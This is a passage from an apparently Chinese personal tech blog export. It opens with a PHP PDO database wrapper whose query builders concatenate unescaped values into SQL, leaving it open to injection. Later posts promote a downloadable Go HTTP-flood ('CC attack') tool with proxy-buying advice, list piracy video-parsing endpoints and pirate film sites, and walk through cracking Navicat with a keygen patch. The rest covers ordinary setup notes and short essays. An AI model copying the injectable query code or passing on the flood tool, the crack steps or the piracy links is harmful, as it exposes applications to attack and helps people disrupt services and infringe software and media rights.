\u0026#39;;dbname=\u0026#39; . $this-\u0026gt;dbName; $options = $this-\u0026gt;pConnect ? [\\PDO::ATTR_PERSISTENT =\u0026gt; true] : []; try { $dbh = new \\PDO($dsn, $this-\u0026gt;user, $this-\u0026gt;pass, $options); $dbh-\u0026gt;setAttribute(\\PDO::ATTR_ERRMODE, \\PDO::ERRMODE_EXCEPTION); $dbh-\u0026gt;setAttribute(\\PDO::ATTR_EMULATE_PREPARES, false); } catch (\\PDOException $e) { throw new \\Exception(\u0026#39;Connection failed: \u0026#39; . $e-\u0026gt;getMessage()); } $dbh-\u0026gt;exec(\u0026#39;SET NAMES utf8\u0026#39;); self::$db = $dbh; } /** * @return object */ public static function instance() { return new self(); } /** * 设置数据表名 * @param $table * @return object */ public static function name($table) { if (empty($table)) { halt(\u0026#39;不能设置数据表名为空\u0026#39;); } $tableS = C(\u0026#39;DB_PRE\u0026#39;) . $table; self::$table = self::addChar($tableS); return new self(); } /** * 设置数据表名 * @param $table * @return object */ public static function table($table) { if (empty($table)) { halt(\u0026#39;不能设置数据表名为空\u0026#39;); } self::$table = self::addChar($table); return new self(); } /** * 设置当前数据表别名 * @param $alias * @return object */ public function alias($alias): object { if (empty($alias) or empty(self::$table)) { halt(\u0026#39;数据库表名设置别名为空\u0026#39;); } self::$table .= \u0026#39; AS \u0026#39; . $alias; return $this; } private static function addChar($value, $num = 0) { if (strpos($value, \u0026#34;`\u0026#34;) === false and $num == 1 and !is_int($value)) { $data = \u0026#34;\u0026#39;\u0026#34; . trim($value) . \u0026#34;\u0026#39;\u0026#34;; } else if (strpos($value, \u0026#34;`\u0026#34;) === false and !is_int($value) and $num != 1) { $data = \u0026#34;`\u0026#34; . trim($value) . \u0026#34;`\u0026#34;; } else { $data = trim($value); } return $data; } /** * 执行查询 主要针对 SELECT, SHOW 等指令 * @param string $sql * @return mixed */ public function doQuery($sql = \u0026#39;\u0026#39;, $options = true) { self::$sql = $sql; if ($options) { $result = self::$db-\u0026gt;query(self::$sql)-\u0026gt;fetchAll(\\PDO::FETCH_ASSOC); } else { $result = self::$db-\u0026gt;query(self::$sql)-\u0026gt;fetch(\\PDO::FETCH_ASSOC); } return $result; } /** * 执行语句 针对 INSERT, UPDATE 以及DELETE,exec结果返回受影响的行数 * @param string $sql * @return mixed */ public function doExec($sql = \u0026#39;\u0026#39;, $op = \u0026#39;\u0026#39;) { self::$sql = $sql; $res = self::$db-\u0026gt;exec(self::$sql); if ($op == \u0026#39;insert\u0026#39;) { $res = $this-\u0026gt;getLastInsId(); } return $res; } /** * 执行sql语句，自动判断进行查询或者执行操作 * @param string $sql SQL指令 * @return mixed */ public function doSql($sql = \u0026#39;\u0026#39;) { $queryIps = \u0026#39;INSERT|UPDATE|DELETE|REPLACE|CREATE|DROP|LOAD DATA|SELECT .* INTO|COPY|ALTER|GRANT|REVOKE|LOCK|UNLOCK\u0026#39;; if (preg_match(\u0026#39;/^\\s*\u0026#34;?(\u0026#39; . $queryIps . \u0026#39;)\\s+/i\u0026#39;, $sql)) { return $this-\u0026gt;doExec($sql); } else { return $this-\u0026gt;doQuery($sql); } } /** * 获取上一次查询的sql * @return string */ public function getLastSql() { return self::$sql; } /** * 插入方法 * @param array $data * @return mixed * @throws \\Exception */ public function insert(array $data) { $data = $this-\u0026gt;dataFormat($data); if (!$data) { exit(\u0026#39;插入数据不能为空\u0026#39;); } $sql = \u0026#39;INSERT INTO \u0026#39; . self::$table . \u0026#39;(\u0026#39; . implode(\u0026#39;,\u0026#39;, array_keys($data)) . \u0026#39;) VALUES(\u0026#39; . implode(\u0026#39;,\u0026#39;, array_values($data)) . \u0026#39;)\u0026#39;; return $this-\u0026gt;doExec($sql, \u0026#39;insert\u0026#39;); } /** * 批量插入方法 * @param array $data * @return mixed * @throws \\Exception */ public function insertAll(array $data) { $value = \u0026#39;(\u0026#39;; foreach ($data as $k =\u0026gt; $v) { foreach ($v as $k1 =\u0026gt; $v1) { $value .= \u0026#34;\u0026#39;\u0026#34; . $v1 . \u0026#34;\u0026#39;,\u0026#34;; } $value = rtrim($value, \u0026#39;,\u0026#39;); $value .= \u0026#39;), (\u0026#39;; } $value = rtrim($value, \u0026#39;, (\u0026#39;); $sql = \u0026#39;INSERT INTO \u0026#39; . self::$table . \u0026#39;(\u0026#39; . implode(\u0026#39;,\u0026#39;, array_keys($data[0])) . \u0026#39;) VALUES \u0026#39; . $value; return $this-\u0026gt;doExec($sql, false); } /** * 获取最后一次插入时的ID * @return mixed */ public function getLastInsId() { $sql = \u0026#39;SELECT LAST_INSERT_ID()\u0026#39;; $res = $this-\u0026gt;doQuery($sql, false); return isset($res[\u0026#39;LAST_INSERT_ID()\u0026#39;]) ? $res[\u0026#39;LAST_INSERT_ID()\u0026#39;] : \u0026#39;false\u0026#39;; } /** * 删除方法 * @return mixed * @throws \\Exception */ public function delete() { //安全考虑,阻止全表删除 if (!trim($this-\u0026gt;where)) { exit(\u0026#39;删除条件禁止为空\u0026#39;); } $sql = \u0026#39;DELETE FROM \u0026#39; . self::$table . \u0026#39; \u0026#39; . $this-\u0026gt;where; $this-\u0026gt;clear = 1; $this-\u0026gt;clear(); return $this-\u0026gt;doExec($sql); } /** * 更新方法 * @param array $data * @return mixed|void * @throws \\Exception */ public function update(array $data) { //安全考虑,阻止全表更新 if (!trim($this-\u0026gt;where)) { exit(\u0026#39;更新条件禁止为空\u0026#39;); } $data = $this-\u0026gt;dataFormat($data); if (!$data) { return; } $valArr = array(); foreach ($data as $k =\u0026gt; $v) { $valArr[] = $k . \u0026#39;=\u0026#39; . $v; } $valStr = implode(\u0026#39;,\u0026#39;, $valArr); $sql = \u0026#39;UPDATE \u0026#39; . trim(self::$table) . \u0026#39; SET \u0026#39; . trim($valStr) . \u0026#39; \u0026#39; . trim($this-\u0026gt;where); return $this-\u0026gt;doExec($sql); } /** * 更新语句 字段值加 $number * @param array|string $field * @param null $number * @return mixed|void * @throws \\Exception */ public function setInc($field, $number = null) { //安全考虑,阻止全表更新 if (!trim($this-\u0026gt;where)) { exit(\u0026#39;更新条件禁止为空\u0026#39;); } if (is_array($field)) { $data = $this-\u0026gt;dataFormat($field); if (!$data) { return; } $valArr = array(); foreach ($data as $k =\u0026gt; $v) { $valArr[] = $k . \u0026#39;=\u0026#39; . $k . \u0026#39;+\u0026#39; . $v; } $valStr = implode(\u0026#39;,\u0026#39;, $valArr); $sql = \u0026#39;UPDATE \u0026#39; . trim(self::$table) . \u0026#39; SET \u0026#39; . trim($valStr) . \u0026#39; \u0026#39; . trim($this-\u0026gt;where); } else if (is_string($field) and is_null($number)) { $sql = \u0026#39;UPDATE \u0026#39; . trim(self::$table) . \u0026#39; SET \u0026#39; . self::addChar($field) . \u0026#39;=\u0026#39; . self::addChar($field) . \u0026#39;+1 \u0026#39; . trim($this-\u0026gt;where); } else { $sql = \u0026#39;UPDATE \u0026#39; . trim(self::$table) . \u0026#39; SET \u0026#39; . self::addChar($field) . \u0026#39;=\u0026#39; . self::addChar($field) . \u0026#39;+\u0026#39; . self::addChar($number, 1) . \u0026#39; \u0026#39; . trim($this-\u0026gt;where); } return $this-\u0026gt;doExec($sql); } /** * 更新语句 字段值减 $number * @param array|string $field * @param null $number * @return mixed|void * @throws \\Exception */ public function setDec($field, $number = null) { //安全考虑,阻止全表更新 if (!trim($this-\u0026gt;where)) { exit(\u0026#39;更新条件禁止为空\u0026#39;); } if (is_array($field)) { $data = $this-\u0026gt;dataFormat($field); if (!$data) { return; } $valArr = array(); foreach ($data as $k =\u0026gt; $v) { $valArr[] = $k . \u0026#39;=\u0026#39; . $k . \u0026#39;-\u0026#39; . $v; } $valStr = implode(\u0026#39;,\u0026#39;, $valArr); $sql = \u0026#39;UPDATE \u0026#39; . trim(self::$table) . \u0026#39; SET \u0026#39; . trim($valStr) . \u0026#39; \u0026#39; . trim($this-\u0026gt;where); } else if (is_string($field) and is_null($number)) { $sql = \u0026#39;UPDATE \u0026#39; . trim(self::$table) . \u0026#39; SET \u0026#39; . self::addChar($field) . \u0026#39;=\u0026#39; . self::addChar($field) . \u0026#39;-1 \u0026#39; . trim($this-\u0026gt;where); } else { $sql = \u0026#39;UPDATE \u0026#39; . trim(self::$table) . \u0026#39; SET \u0026#39; . self::addChar($field) . \u0026#39;=\u0026#39; . self::addChar($field) . \u0026#39;-\u0026#39; . self::addChar($number, 1) . \u0026#39; \u0026#39; . trim($this-\u0026gt;where); } return $this-\u0026gt;doExec($sql); } /** * 查询函数 * @return array|boolean 结果集 */ public function select() { $sql = \u0026#39;SELECT \u0026#39; . trim($this-\u0026gt;field) . \u0026#39; FROM \u0026#39; . self::$table . \u0026#39; \u0026#39; . trim($this-\u0026gt;where) . \u0026#39; \u0026#39; . trim($this-\u0026gt;order) . \u0026#39; \u0026#39; . trim($this-\u0026gt;limit) . \u0026#34; \u0026#34; . trim($this-\u0026gt;group); $this-\u0026gt;clear = 1; $this-\u0026gt;clear(); $res = $this-\u0026gt;doQuery(trim($sql)); return isset($res[0]) ? $res : []; } /** * 查询函数 * @return array|boolean 结果集 */ public function find() { $sql = \u0026#34;SELECT \u0026#34; . trim($this-\u0026gt;field) . \u0026#34; FROM \u0026#34; . self::$table . \u0026#34; \u0026#34; . trim($this-\u0026gt;where) . \u0026#34; \u0026#34; . trim($this-\u0026gt;order) . \u0026#34; \u0026#34; . trim(\u0026#34; LIMIT 1\u0026#34;) . \u0026#34; \u0026#34; . trim($this-\u0026gt;group); $this-\u0026gt;clear = 1; $this-\u0026gt;clear(); return $this-\u0026gt;doQuery(trim($sql), false); } /** * 设置条件 * @param string | array $option * @param string $where * @param string $value * @return $this */ public function where($option, $where = null, $value = null) { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } // 判断之前是否使用where语句 if (strpos($this-\u0026gt;where, \u0026#39;WHERE\u0026#39;)) { $this-\u0026gt;where .= \u0026#39; AND \u0026#39;; $useWhere = 1; } else { $this-\u0026gt;where = \u0026#39; WHERE \u0026#39;; } // 判断第一个参数为字符 if (is_string($option)) { // 当三个参数都为字符串 if (!is_null($value)): $this-\u0026gt;where .= $option . $this-\u0026gt;whereTo($where) . $this-\u0026gt;addChar($value, 1); endif; // 当第三个参数不存在 if (is_null($value)) { $this-\u0026gt;where .= $option . \u0026#39;=\u0026#39; . $this-\u0026gt;addChar($where, 1); } else if (is_null($where)) { // 当第二个参数不存在 $this-\u0026gt;where .= $option; } } else if (is_array($option)) { // 当第一个参数为数组 $qz = \u0026#34;(\u0026#34;; foreach ($option as $v) { // 当第一个参数循环后为数组 if (is_array($v)) { if (strstr($this-\u0026gt;where, \u0026#39;(\u0026#39;)) { $qz = \u0026#39; \u0026#39;; } if (isset($useWhere)) { $qz = \u0026#39;(\u0026#39;; unset($useWhere); } $condition = $qz . $this-\u0026gt;addChar($v[0], \u0026#39;where\u0026#39;) . \u0026#39; \u0026#39; . $v[1] . \u0026#39; \u0026#39; . $this-\u0026gt;addChar($v[2], 1); } else { $this-\u0026gt;where .= \u0026#39; \u0026#39; . $this-\u0026gt;addChar($option[0]) . $option[1] . $option[2]; $cc = 1; break; } $logIc = isset($v[3]) ? \u0026#39; \u0026#39; . $v[3] : \u0026#39; AND\u0026#39;; $this-\u0026gt;where .= isset($mark) ? $logIc . $condition : $condition; $mark = 1; } if (!isset($cc)) { $this-\u0026gt;where .= \u0026#39;)\u0026#39;; } } return $this; } private function whereTo($field) { switch ($field) { case ($field == \u0026#39;neq\u0026#39; or $field == \u0026#39;!=\u0026#39;): return \u0026#39;!=\u0026#39;; case ($field == \u0026#39;eq\u0026#39; or $field == \u0026#39;=\u0026#39;): return \u0026#39;=\u0026#39;; case ($field == \u0026#39;like\u0026#39; or $field == \u0026#39;%\u0026#39;): return \u0026#39;LIKE\u0026#39;; default: return $field; } } /** * 设置条件 * @param string $option * @param string | array $value * @return $this */ public function whereIn($option, $value, $tj = \u0026#39;AND\u0026#39;) { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } // 判断之前是否使用where语句 if (strpos($this-\u0026gt;where, \u0026#39;WHERE\u0026#39;)) { $this-\u0026gt;where .= \u0026#39; \u0026#39; . $tj . \u0026#39; \u0026#39;; $useWhere = 1; } else { $this-\u0026gt;where = \u0026#39; WHERE \u0026#39;; } $arr = explode(\u0026#39;,\u0026#39;, $value); $str = \u0026#39;\u0026#39;; foreach ($arr as $v) { $str .= $this-\u0026gt;addChar($v, 1) . \u0026#39;,\u0026#39;; } $str = rtrim($str, \u0026#39;,\u0026#39;); // 判断第一个参数为字符 if (is_string($value)) { $this-\u0026gt;where .= $option . \u0026#34; IN (\u0026#34; . $str . \u0026#34;)\u0026#34;; } else if (is_array($value)) { $str = \u0026#39;\u0026#39;; foreach ($value as $v) { $str .= $this-\u0026gt;addChar($v, 1) . \u0026#39;,\u0026#39;; } $str = rtrim($str, \u0026#39;,\u0026#39;); $this-\u0026gt;where .= $option . \u0026#34; IN (\u0026#34; . $str . \u0026#34;)\u0026#34;; } return $this; } /** * 设置条件 * @param $option * @param string $where * @param string $value * @return $this */ public function whereOr($option, $where = null, $value = null) { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } if (strpos($this-\u0026gt;where, \u0026#39;WHERE\u0026#39;)) { $this-\u0026gt;where .= \u0026#39; OR \u0026#39;; $ss = 1; } else { $this-\u0026gt;where = \u0026#39; WHERE \u0026#39;; } if (is_string($option)) { if (!is_null($value)): $this-\u0026gt;where .= $option . $this-\u0026gt;whereTo($where) . $this-\u0026gt;addChar($value, 1); endif; if (is_null($value)) { $this-\u0026gt;where .= $option . \u0026#39;=\u0026#39; . $this-\u0026gt;addChar($where, 1); } else if (is_null($where)) { $this-\u0026gt;where .= $option; } } else if (is_array($option)) { $qz = \u0026#39;(\u0026#39;; foreach ($option as $v) { $logIc = \u0026#39; AND\u0026#39;; if (is_array($v)) { if (strstr($this-\u0026gt;where, \u0026#39;(\u0026#39;)) { $qz = \u0026#39; \u0026#39;; } if (isset($ss)) { $qz = \u0026#39;(\u0026#39;; unset($ss); } $condition = $qz . $this-\u0026gt;addChar($v[0]) . \u0026#39; \u0026#39; . $v[1] . \u0026#39; \u0026#39; . $this-\u0026gt;addChar($v[2], 1); } else { $this-\u0026gt;where .= \u0026#39; \u0026#39; . $this-\u0026gt;addChar($option[0]) . $option[1] . $option[2]; $cc = 1; break; } if (isset($v[3]) and ($v[3] == \u0026#39;or\u0026#39; or $v[3] == \u0026#39;OR\u0026#39;)) { $logIc = \u0026#39; OR\u0026#39;; $this-\u0026gt;where .= isset($mark) ? $logIc . $condition : $condition; } else { $this-\u0026gt;where .= isset($mark) ? $logIc . $condition : $condition; } $mark = 1; } if (!isset($cc)) { $this-\u0026gt;where .= \u0026#39;)\u0026#39;; } } return $this; } /** * 取得数据表的字段信息 * @return array */ public function tbFields() { $sql = \u0026#39;SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=\u0026#34;\u0026#39; . str_replace(\u0026#39;`\u0026#39;, \u0026#39;\u0026#39;, self::$table) . \u0026#39;\u0026#34; AND TABLE_SCHEMA=\u0026#34;\u0026#39; . $this-\u0026gt;dbName . \u0026#39;\u0026#34;\u0026#39;; $res = $this-\u0026gt;doQuery($sql); $ret = array(); foreach ($res as $key =\u0026gt; $value) { $ret[] = $value[\u0026#39;COLUMN_NAME\u0026#39;]; } return $ret; } /** * 过滤并格式化数据表字段 * @param $data * @return array */ public function dataFormat($data) { if (!is_array($data)) { return []; } $table_column = $this-\u0026gt;tbFields(); $ret = []; foreach ($data as $key =\u0026gt; $val): if (!is_scalar($val)) { continue; } if (array_key_exists($key, $table_column)): $key = $this-\u0026gt;addChar($key); if (is_int($val)) { $val = intval($val); } else if (is_float($val)) { $val = floatval($val); } else if (preg_match(\u0026#39;/^\\(\\w*(\\+|\\-|\\*|\\/)?\\w*\\)$/i\u0026#39;, $val)) { $val = $val; } elseif (is_string($val)) { $val = \u0026#39;\u0026#34;\u0026#39; . addslashes($val) . \u0026#39;\u0026#34;\u0026#39;; } $ret[$key] = $val; endif; endforeach; return $ret; } /** * 排序 * @param $option * @param null $sort * @return $this */ public function order($option, $sort = null) { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } $this-\u0026gt;order = \u0026#39; ORDER BY \u0026#39;; if (!is_null($sort)) { $this-\u0026gt;order .= $option . \u0026#39; \u0026#39; . $sort; } else if (is_string($option)) { $this-\u0026gt;order .= $option; } else if (is_array($option)) { foreach ($option as $k =\u0026gt; $v) { $order = $k . \u0026#34; \u0026#34; . $v; $this-\u0026gt;order .= isset($mark) ? \u0026#39;,\u0026#39; . $order : $order; $mark = 1; } } return $this; } /** * @param $option * @return $this */ public function group($option) { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } $this-\u0026gt;group = \u0026#39; GROUP BY \u0026#39; . $option; return $this; } /** * 分页 * @param $page * @param null $pageSize * @return $this */ public function limit($page, $pageSize = null) { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } if ($pageSize === null) { $this-\u0026gt;limit = \u0026#39;LIMIT \u0026#39; . $page; } else { $pagEval = intval(($page - 1) * $pageSize); $this-\u0026gt;limit = \u0026#39;LIMIT \u0026#39; . $pagEval . \u0026#39;,\u0026#39; . $pageSize; } return $this; } /** * 设置字段名 * @param $field * @return $this */ public function field($field) { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } $this-\u0026gt;field = $field; return $this; } /** * 查询 左右内全 * @param $tab * @param string $where * @param string $join * @return $this */ public function join($tab, $where = \u0026#39;\u0026#39;, $join = \u0026#39;INNER\u0026#39;) { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } if (is_array($tab)) { foreach ($tab as $k =\u0026gt; $v): $table = $k . \u0026#39; AS \u0026#39; . $v; endforeach; } else { $table = str_replace(\u0026#39; \u0026#39;, \u0026#39; AS \u0026#39;, $tab); } self::$table .= \u0026#39; \u0026#39; . $join . \u0026#39; JOIN \u0026#39; . $table . \u0026#39; ON(\u0026#39; . $where . \u0026#39;)\u0026#39;; return $this; } /** * 计数 * @return mixed */ public function count() { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } $sql = \u0026#39;SELECT count(\u0026#39; . trim($this-\u0026gt;field) . \u0026#39;) AS \u0026#39; . trim($this-\u0026gt;field) . \u0026#39; FROM \u0026#39; . self::$table . \u0026#39; \u0026#39; . trim($this-\u0026gt;where) . \u0026#34; \u0026#34; . trim($this-\u0026gt;order); $rows = $this-\u0026gt;doQuery($sql, false); return $rows[trim($this-\u0026gt;field)]; } /** * 统计 * @return mixed */ public function sum() { if ($this-\u0026gt;clear \u0026gt; 0) { $this-\u0026gt;clear(); } $sql = \u0026#39;SELECT SUM(\u0026#39; . trim($this-\u0026gt;field) . \u0026#39;) AS \u0026#39; . trim($this-\u0026gt;field) . \u0026#39; FROM \u0026#39; . self::$table . \u0026#39; \u0026#39; . trim($this-\u0026gt;where) . \u0026#34; \u0026#34; . trim($this-\u0026gt;order); $rows = $this-\u0026gt;doQuery($sql, false); return $rows[trim($this-\u0026gt;field)]; } /** * 清理标记函数 */ private function clear() { $this-\u0026gt;where = \u0026#39;\u0026#39;; $this-\u0026gt;order = \u0026#39;\u0026#39;; $this-\u0026gt;limit = \u0026#39;\u0026#39;; $this-\u0026gt;field = \u0026#39;*\u0026#39;; $this-\u0026gt;clear = 0; } /** * 手动清理标记 * @return $this */ public function clearKey() { $this-\u0026gt;clear(); return $this; } /** * 启动事务 */ public function startTrans() { //数据rollback 支持 if (self::$trans == 0) { self::$db-\u0026gt;beginTransaction(); } self::$trans++; return; } /** * 用于非自动提交状态下面的查询提交 * @return bool */ public function commit() { $result = true; if (self::$trans \u0026gt; 0) { $result = self::$db-\u0026gt;commit(); self::$trans = 0; } return $result; } /** * 事务回滚 * @return bool */ public function rollback() { $result = true; if (self::$trans \u0026gt; 0) { $result = self::$db-\u0026gt;rollback(); self::$trans = 0; } return $result; } /** * 关闭连接 */ public function close() { if (!is_null(self::$db)) { self::$db = null; } } } ","date":"2021-05-07T19:57:00Z","permalink":"https://blog.aaayun.cc/archives/648.html","title":"分享自己封装的mysql类 基于pdo"},{"content":"golang实现CC多线程攻击 内含exe编译后的文件以及源代码\n由于需要大量ip 博主特地找了个收费很低的代理网址 一个月最低3.2 (推荐使用每秒更换ip)\n注册地址\n套餐选择 套餐4-IP不限量 (推荐使用每秒更换ip)\n套餐购买后请将你的ip加入网址的白名单即可使用\n使用方式：./main.exe -h cc.zip\n","date":"2021-04-30T00:59:00Z","permalink":"https://blog.aaayun.cc/archives/641.html","title":"golang实现CC多线程测压"},{"content":"这些都是可以用的免费接口，后缀输入你要解析的视频地址即可\n基本全网影视都可以解析\nPS：不要相信里面任何骗子广告，否则被骗后果自负\nhttps://www.96fg.com/jiexi/?url=\nhttps://9kjx.com/?url=\nhttps://jx.wzslw.cn/?url=\nhttps://jx.ap2p.cn/?url=\nhttps://jsap.attakids.com/?url=\nhttps://jx.4080jx.cc/?url=\nhttp://api.xdiaosi.com/?url=\nhttps://m2090.com/?url=\nhttps://www.xymav.com/?url=\nhttps://jiexi8.com/vip/index.php?url=\nhttps://vip.mpos.ren/v/?url=\nhttps://www.h8jx.com/jiexi.php?url=\nhttps://www.kpezp.cn/jlexi.php?url=\nhttp://33tn.cn/?url=\nhttps://jx.ivito.cn/?url=\nhttps://api.sigujx.com/jx/?url=\nhttps://jx.ergan.top/?url=\nhttps://api.927jx.com/vip/?url=\nhttps://jx.mw0.cc/?url=\nhttps://www.33tn.cn/?url=\nhttps://py.ha12.xyz/sos/index.php?url=\nhttps://jiexi.380k.com/?url=\nhttps://www.administratorw.com/video.php?url=\nhttps://okjx.cc/?url=\nhttps://jiexi.bm6ig.cn/?url=\nhttps://api.lhh.la/vip/?url=\nhttps://api.tv920.com/vip/?url=\n","date":"2021-04-24T01:32:00Z","permalink":"https://blog.aaayun.cc/archives/635.html","title":"vip视频解析接口合集 稳定解析"},{"content":"影视资源采集站收录大全 M3U8资源 百度云资源 http://bdzy.com（暂时很多不能播放）\n八戒资源 http://bajiezy.cc（推荐）\n209资源站 http://www.209zy.net （原33UU）\n麻花资源 http://www.mahuazy.net\n最大资源 http://zuidazy.net\n156资源 http://www.1156zy.net\n酷云资源 http://www.kuyunzy.tv\nok资源 http://www.haozy.cc （可采集下载）\n605资源 http://www.765zy.com\n1866资源 http://www.1886zy.net\n123资源网 http://www.123ku.com\n看看资源 http://kankanzy.com\n高清资源 http://gaoqingzy.com\n乐多资源 http://www.leduozy.com\n永久资源 http://yongjiuzy.cc\n步步高资源 http://www.bbkdj.com/help\nc值云资源 http://www.czhiziyuan.com\n酷播资源 http://kubozy.net\n最新资源 http://www.zuixinzy.cc\n搜乐资源网 https://www.solezy.com\n魔卡资源网 https://mokazy.com\n超快资源 http://265zy.cc\n88资源网 http://www.88zyw.net\n官方资源\n1717资源 http://zy.itono.cn/V10.php\n步步高资源 http://www.bbkdj.com/help\n6u资源网 http://zy.ataoju.com（收费）\n资讯采集接口\n步步高资讯采集接口：http://api.bbkdj.com/json/news 接口类型：json \u0026raquo;\u0026gt; 资源类型：文章 \u0026raquo;\u0026gt; 保存即可！\n","date":"2021-04-23T00:50:00Z","permalink":"https://blog.aaayun.cc/archives/632.html","title":"影视资源采集站收录大全"},{"content":"golang获取本地服务器IP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 func ExternalIP() (net.IP, error) { ifaces, err := net.Interfaces() if err != nil { return nil, err } for _, iface := range ifaces { if iface.Flags\u0026amp;net.FlagUp == 0 { continue // interface down } if iface.Flags\u0026amp;net.FlagLoopback != 0 { continue // loopback interface } addrs, err := iface.Addrs() if err != nil { return nil, err } for _, addr := range addrs { ip := GetIpFromAddr(addr) if ip == nil { continue } return ip, nil } } return nil, errors.New(\u0026#34;connected to the network?\u0026#34;) } func GetIpFromAddr(addr net.Addr) net.IP { var ip net.IP switch v := addr.(type) { case *net.IPNet: ip = v.IP case *net.IPAddr: ip = v.IP } if ip == nil || ip.IsLoopback() { return nil } ip = ip.To4() if ip == nil { return nil // not an ipv4 address } return ip } // 调用方法 ip, err := other.ExternalIP() if err != nil { fmt.Println(err) } fmt.Println(ip) ","date":"2021-04-21T01:01:00Z","permalink":"https://blog.aaayun.cc/archives/629.html","title":"golang获取本地服务器IP"},{"content":"windows下golang编译报running gcc failed错误 报错信息如下\n解决方法 下载mingw mingw-get-setup.zip 下载后点击安装 修改环境变量 如 C:MinGWbin 打开cmd 输入命令mingw-get，如果弹出 MinGw installation manager 窗口，说明安装正常。此时，关闭 MinGw installation manager 窗口，否则接下来的步骤会报错 在cmd中输入命令 mingw-get install gcc，等待一会，gcc 就安装成功了。如果想安装 g++,gdb,只要输入命令 mingw-get install g++ 和 mingw-get install gdb 在cmd中输入 gcc -v 安装成功\n重启ide即可编译成功 tips 在线安装很慢 离线安装包你值得拥有\n","date":"2021-03-31T00:08:00Z","permalink":"https://blog.aaayun.cc/archives/622.html","title":"windows下golang编译报running gcc failed错误"},{"content":"记一次centos7在断网环境下编译安装nginx1.6+php7.2 下载我们用到的依赖包文件 nginx1.6\u0026amp;php7.2.zip\nunzip解压下载的包\n1 unzip nginx+php7.2.zip 安装依赖\n1 rpm -Uvh *.rpm tar解压nginx\n1 tar -zxvf nginx-1.6.0.tar.gz -C /usr/local/ngnix 编译nginx\n1 2 3 4 cd /usr/local/nginx ./configure mske \u0026amp;\u0026amp; make install whereis nginx 启动nginx\n1 cd /usr/local/nginx/sbin/nginx 测试nginx\n重启nginx进程\n1 2 /usr/local/nginx/sbin/nginx -s reload ps -ef | grep nginx 未完待续\n","date":"2021-03-26T18:58:00Z","permalink":"https://blog.aaayun.cc/archives/610.html","title":"记一次centos7在断网环境下编译安装nginx1.6+php7.2"},{"content":"死亡是终点，但不是目的。人生不就像是一场旅行吗？每个人可能都有各自的目的地(不同的死因)。但是，旅行的意义就是在于享受旅程，享受当下啊！！人生不也一样啊？\n{dplayer src=\u0026ldquo;https://uss.aaayun.cc/typecho/uploads/2021/03/32470077.mp4\"/}\n","date":"2021-03-23T05:07:00Z","permalink":"https://blog.aaayun.cc/archives/604.html","title":"人生"},{"content":"人间若无悲情客，何来诗者赋年华\n","date":"2021-03-21T08:52:28Z","permalink":"https://blog.aaayun.cc/archives/601.html","title":"悲情客"},{"content":"windows下Navicat15破解详细教程带注册机 去官网下载最新版本下载安装，激活Navicat Premium，下载激活软件， 无需断网运行激活软件 Navicat Keygen Patch v5.6.0（以管理员身份运行）\n点击Path选择安装Navicat路径下的navicat.exe\n显示下图则替换成功 显示下图，则是以前破解失败残留的文件， 要去软件安装路径下找到下图2个文件删除 点击确定，接下来修改注册信息生成注册码\n点击Generate生成注册码，打开将Navicat将注册码复制进注册框\n点击激活，选择手动激活\n将请求码复制到激活软件生成激活码，将生成的激活码复制到软件激活框激活\n激活成功\n","date":"2021-03-19T21:55:00Z","permalink":"https://blog.aaayun.cc/archives/599.html","title":"windows下Navicat15破解详细教程带注册机"},{"content":"Windows10安装GCC和Make工具 下载并安装Windows版的cygwin 解压并双击setup-x86_64.exe，启动cygwin安装 选择Install from internet\n填写163镜像：http://mirrors.163.com/cygwin/ 并按“add”按钮\n选择安装gcc 选择安装make，完成选择后按“下一步”按钮，完成安装\n启动cygwin，键入命令：“make -v”和“gcc -v”，若运行成功，证明在Windows10安装GCC和Make工具成功！\n","date":"2021-03-19T18:36:00Z","permalink":"https://blog.aaayun.cc/archives/589.html","title":"Windows10安装GCC和Make工具"},{"content":"微活码系统 微信群满100人以后，就不能扫描二维码入群了怎么办？\n用活码就能完美解决这个问题。\n使用微信群活码工具，二维码永不过期，不受100人限制，对外统一宣传一个固定的二维码，后台可以随时更换群二维码。\n每天海量流量。轻轻松松一天加满上百个群！\n什么是微信活码？\n在我们平台创建一个活码二维码，然后在这个活码后台上传多张你的群二维码，用户扫描活码，就会分配给他一张群二维码。\n用户扫描100次（也可以自定义）后自动切换到下一张群二维码！\n微信群裂变利器，不受100人扫码限制\n微信群营销推广只需一个固定的群活码，多个群二维码自动轮换，每进群100人自动换新群，所有人都可通过扫码进群，快速裂变。永不过期！\n个人号营销不受被动加好友数量限制\n个人号营销推广只需一个固定不变的客服码，多个微信个人号二维码自动轮换，不受每天被动加好友人数限制，提升推广效率\n多维度的数据统计分析，实现精准营销\n提供数据统计报告！\n提供精美的分析报告，让你的微信营销数据化！\n自定义域名\n绑定自己的独立域名，增强品牌识别度，降低被封的风险！\n微信防封等功能\n售价 3200\n个人版开源地址 https://gitee.com/anderyly/HuoMaGe\n图片预览 ","date":"2021-03-03T02:18:00Z","permalink":"https://blog.aaayun.cc/archives/577.html","title":"微活码管理系统"},{"content":"宝塔的定时任务最低周期为一分钟，那么我们可以通过执行shell脚本的方法来实现秒级监控，也就是无限循环，但是会大量消耗资源，请谨慎添加\n在某某博客看到的源码复制下来执行直接报错\n博主看了一会shell教程 修改了一下 代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 #!/bin/bash declare -i step step=25 # 这里是秒 for ((i = 0; i \u0026lt;= 60; i += step)) do curl -sS --connect-timeout 10 -m 60 \u0026#39;URL地址\u0026#39; echo -e \u0026#34;\\n----------------------------------------------------------------------------\u0026#34; endDate=`date +\u0026#34;%Y-%m-%d %H:%M:%S\u0026#34;` echo \u0026#34;★[$endDate] Successful\u0026#34; echo 